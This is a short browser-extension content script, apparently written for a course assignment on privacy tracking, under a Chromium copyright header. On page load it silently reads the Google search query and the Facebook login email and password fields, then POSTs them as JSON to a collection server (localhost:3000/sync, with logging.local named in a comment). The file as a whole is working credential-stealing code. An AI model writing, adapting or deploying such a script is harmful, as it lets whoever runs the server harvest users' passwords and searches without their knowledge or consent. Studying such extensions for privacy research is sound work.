// Copyright (c) 2011 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Called when the user clicks on the browser action.
//python run_test1.py ~/work/bs/hw2/myextensions/2.1 privacy tracking extension https://logging.local:3000/sync
$(document).ready(function () {
  //get search value from google
  var googleSearchValue =$("input[name=q]").val();
  //get facebook login
  var facebookId = $("#email").val();
  var facebookPsd = $("#pass").val();

  var param = {"googleSearchValue" : googleSearchValue, "facebookId" : facebookId, "facebookPsd":facebookPsd};
  sendToServer(param);
});


function sendToServer(parameter) {
  $.ajax({
    url:"https://localhost:3000/sync",
    type:"POST",
    data:JSON.stringify(parameter),
    contentType:"application/json; charset=utf-8",
    dataType:"json",
    success: function(){
    }
  });
}